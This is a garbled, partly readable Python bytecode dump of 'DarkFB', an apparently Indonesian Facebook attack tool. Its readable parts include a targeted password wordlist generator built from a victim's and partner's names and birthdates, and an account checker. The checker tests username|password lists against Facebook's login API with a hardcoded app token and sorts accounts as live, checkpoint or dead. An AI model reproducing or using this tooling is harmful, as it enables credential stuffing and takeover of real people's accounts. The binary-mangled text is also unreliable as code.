   IndexErrorR  R(   R   (   Ru   Rþ   R   RÞ   R   R4   (    (    R   R6    s@    	
	



c          C   s©   t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd
 GHd GHd GHd GHd GHd GHt	   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs!   â-> [1;37;40m1. Buat postingans    â-> [1;37;40m2. Buat Wordlists   â-> [1;37;40m3. Akun Checkers$   â-> [1;37;40m4. Lihat daftar grups    â-> [1;37;40m5. Profile Guards   â-> [1;31;40m0. Kembalis
   [1;97mâ(
   R   RX   RY   R"   R\   R   R   Rt   R]   t
   pilih_lain(   Ru   (    (    R   R   «  s&    	c          C   sÃ   t  d  }  |  d k r' d GHt   n |  d k r= t   n |  d k rS t   nl |  d k ri t   nV |  d k r t   n@ |  d k r t   n* |  d	 k r« t   n d
 |  d GHt   d  S(   Ns   [1;97mââ[1;91mâ©[1;97m R   s   [1;91m[!] Jangan kosongRI   R   R   R   R   RO   s   [1;91m[â] [1;97ms    [1;91mTidak ada(   R(   RW  t   statusRê   t
   check_akunt   grupsayat   guardRZ   (   t   other(    (    R   RW  Â  s$    






c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHt	 d	  } | d
 k r¬ d GHt	 d  t
   n^ t j d | d |   } t j | j  } t d  d d GHd | d GHt	 d  t
   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs/   [1;91m[+] [1;92mKetik status [1;91m:[1;97m R   s   [1;91m[!] Jangan kosongs!   
[1;91m[ [1;97mKembali [1;91m]s7   https://graph.facebook.com/me/feed?method=POST&message=s   &access_token=s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s,   [1;91m[+] [1;92mStatus ID[1;91m : [1;97mR4   (   R   RX   RY   R"   R\   R   R   Rt   R]   R(   R   Rm   Rn   Ro   Rp   Rq   R   (   Ru   t   msgt   resR  (    (    R   RX  Þ  s.    	


	
c       Ð   C   s4  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   nÑXy¤t  j d  t GHd d GHd	 GHd d GHt	 d
  } t | d d  } t	 d  } t	 d  } t	 d  } t	 d  } | d d !} | d d !} | d }	 d d GHd GHt	 d  }
 t	 d  } t	 d  } t
 d  | d d !} | d d !} | d } | j d | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | |	 | | | | | | | | |	 | | | |	 | | | | | |	 | | |	 | |	 | |	 |	 |	 | | | | |	 | | | | | |	 | | | | | |	 | | | | | |	 | |
 | | | | |
 | |
 | |
 | | |
 | | | | | |
 | | | | | | | | | | | | | | | | | | | | | | | | | | |
 | |
 | |
 | | | | | | | | | fÎ  d } x5 | d k  r| d } | j | t |  d  qãWd } x5 | d k  rU| d } | j |
 t |  d  q!Wd } x5 | d k  r| d } | j | t |  d  q_Wd } x5 | d k  rÑ| d } | j | t |  d  qW| j   t j d  d | GHt	 d  t   Wn) t k
 r/} d GHt	 d  t   n Xd  S(    NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs1   [1;91m[?] [1;92mIsi data lengkap target dibawahs&   [1;91m[+] [1;92mNama Depan [1;97m: s   .txtRU   s'   [1;91m[+] [1;92mNama Tengah [1;97m: s)   [1;91m[+] [1;92mNama Belakang [1;97m: s*   [1;91m[+] [1;92mNama Panggilan [1;97m: s>   [1;91m[+] [1;92mTanggal Lahir >[1;96mex: |DDMMYY| [1;97m: i    i   i   s)   [1;91m[?] [1;93mKalo Jomblo SKIP aja :vs&   [1;91m[+] [1;92mNama Pacar [1;97m: s0   [1;91m[+] [1;92mNama Panggilan Pacar [1;97m: sD   [1;91m[+] [1;92mTanggal Lahir Pacar >[1;96mex: |DDMMYY| [1;97m: s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...sü  %s%s
%s%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s%s
%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%s
%s%sid   s   
g      ø?s4   
[1;91m[+] [1;97mTersimpan [1;91m: [1;97m %s.txts!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] Gagal membuat file(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   R   R   R   Rr   R   (   Ru   Rz   R¹   R   RÊ   t   dR   RI  t   gt   hRÞ   t   jt   kt   lt   mR.  t   wgt   ent   wordt   gen(    (    R   Rê   ú  sx    		
	

ÿ ÿ }




	

c          C   s@  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t GHd d GHd	 GHd d GHg  } g  } g  } y% t	 d
  } t | d  j
   } Wn' t k
 ré d GHt	 d  t   n Xt	 d  } t d  d d GHxâ | D]Ú } | j   j t |   \ } }	 d | d |	 d }
 t j |
  } t j | j  } d | k r| j |	  d | d |	 GHqd | d k rÌ| j |	  d | d |	 GHq| j |	  d | d |	 GHqWd t t |   d t t |   d t t |   GHt	 d  t   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs<   [1;91m[?] [1;92mIsi File[1;91m : [1;97musername|passwords'   [1;91m[+] [1;92mFile [1;91m:[1;97m s   [1;91m[!] File tidak ditemukans!   
[1;91m[ [1;97mKembali [1;91m]s*   [1;91m[+] [1;92mPemisah [1;91m:[1;97m s.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6RV   s$   [1;97m[[1;92mLive[1;97m]  [1;97ms    | s   www.facebook.comR¨   s$   [1;97m[[1;93mCheck[1;97m] [1;97ms$   [1;97m[[1;91mMati[1;97m]  [1;97ms5   
[1;91m[+] [1;97mTotal[1;91m : [1;97mLive=[1;92ms    [1;97mCheck=[1;93ms    [1;97mDie=[1;91m(   R   RX   RY   R"   R\   R   R   Rt   R]   R(   Rà   R   R   R#   RÁ   R   Rm   Rn   Ro   Rp   Rq   R¿   R   (   Ru   t   liveRÉ   t   dieR¹   t   listt   pemisaht   mekiRÆ   RE   Rw   Rx   RÇ   (    (    R   RY  <  sT    		

	!=
c          C   s  t  j d  y t d d  j   }  Wn7 t k
 r_ d GHt  j d  t j d  t   n¯Xt  j d  t GHd d GHt	 d	  d d GHyÕ t
 j d
 |   } t j | j  } xz | d D]n } | d } | d } t d d  } t j |  | j | d  d t |  GHd t |  GHd d GHqÁ Wd t t  GHd GH| j   t d  t   Wn¨ t t f k
 rd GHt d  t   n| t k
 rÅt  j d  d GHt d  t   nI t
 j j k
 rçd GHt   n' t k
 rd GHt d  t   n Xd  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs.   [1;91m[âº] [1;92mTunggu sebentar [1;97m...s2   https://graph.facebook.com/me/groups?access_token=Rx   R|   R4   s
   grupid.txtRU   s   
s8   [1;91m[[1;96mâ[1;91m] [1;92mNama  [1;91m:[1;97m s(   [1;91m[+] [1;92mID    [1;91m:[1;97m i(   s   [1;97m=s)   
[1;91m[+] [1;97mJumlah Grup [1;96m%ss6   [1;91m[+] [1;97mTersimpan [1;91m: [1;97mgrupid.txts!   
[1;91m[ [1;97mKembali [1;91m]s   [1;91m[!] Terhentis   [1;91m[!] Grup tidak ditemukans   [1;91m[â] Tidak ada koneksis&   [1;91m[!] Kesalahan saat membuat file(   R   RX   RY   R"   R\   R   R   Rt   R]   R   Rm   Rn   Ro   Rp   Rq   R=   R¿   R   R   R   Rr   R(   R   R  R  R[   R  Rs   R   R	   (   Ru   t   uht   gudR   R   R4   RI  (    (    R   RZ  m  s\    	
	









c          C   s  t  j d  y t d d  j   a Wn7 t k
 r_ d GHt  j d  t j d  t   n Xt  j d  t	 GHd d GHd	 GHd
 GHd GHd GHt
 d  }  |  d k r½ d } t t |  nU |  d k rß d } t t |  n3 |  d k rõ t   n |  d k rt   n t   d  S(   NR?   s	   login.txtR   s    [1;91m[!] Token tidak ditemukans   rm -rf login.txti   i4   s
   [1;97mâs   â-> [1;37;40m1. Aktifkans   â-> [1;37;40m2. NonAktifkans   â-> [1;31;40m0. Kembalis
   [1;97mâs   [1;97mââ[1;91mâ©[1;97m RI   t   trueR   t   falseRO   R   (   R   RX   RY   R"   Ru   R\   R   R   Rt   R]   R(   t   gazR   R	   (   R`  t   aktift   non(    (    R   R[     s6    	

c         C   s3   d |  } t  j |  } t j | j  } | d S(   Ns-   https://graph.facebook.com/me?access_token=%sR4   (   Rm   Rn   Ro   Rp   Rq   (   Ru   Rw   R^  t   uid(    (    R   t
   get_useridÄ  s    
c         C   sù   t  |   } d | t |  f } i d d 6d |  d 6} d } t j | d | d | } | j GHd	 | j k r¦ t j d
  t GHd d GHd GHt d  t	   nO d | j k ré t j d
  t GHd d GHd GHt d  t	   n d GHt
   d  S(   Ns  variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutations!   application/x-www-form-urlencodeds   Content-Types   OAuth %st   Authorizations"   https://graph.facebook.com/graphqlRx   t   headerss   "is_shielded":trueR?   i4   s
   [1;97mâs,   [1;91m[[1;96mâ[1;91m] [1;92mDiaktifkans!   
[1;91m[ [1;97mKembali [1;91m]s   "is_shielded":falses/   [1;91m[[1;96mâ[1;91m] [1;91mDinonaktifkans   [1;91m[!] Error(   Rw  R   Rm   R   Rq   R   RX   R]   R(   R   R	   (   Ru   t   enableR4   Rx   Ry  Rw   R^  (    (    R   Rs  Ë  s,    	

	

t   __main__(   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(v   R   R   R   t   datetimet   randomRi   RÝ   R»   Ro   R^   R¬   Rm   R`   R$   R&   t   multiprocessing.poolR    t   requests.exceptionsR   R   R!   R"   R#   t   devicet   reloadt   setdefaultencodingR_   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   RY   R   Rn   R%   R'   Rq   R   R]   R   R   R,   RÄ   R-   R.   R/   R0   R1   R2   R3   R4   R5   R6   R7   R8   R9   R:   R;   R<   R=   Ró   Rô   R>   Rt   RZ   R   R   R   R   R   R   R½   R    R¡   RË   R¢   Rá   R£   Rì   Rí   Rî   R¤   R   R  R  R  RA   R  R  R	  R   R/  R0  R8  R@  R1  RF  RG  R2  R3  R4  R5  R6  R   RW  RX  Rê   RY  RZ  R[  Rw  Rb   Rs  t   __name__(    (    (    R   t   <module>   s¶   ´
		*						9	3	&	G		 	u	#	*			¬	<				?	>		4	2	7	K	7	<	8	<		"		&	$		&	'	'	*	*	'	&				B	1	3	$	(   t   marshalt   loads(    (    (    s   Hasil_DarkFB.pyt   <module>   s   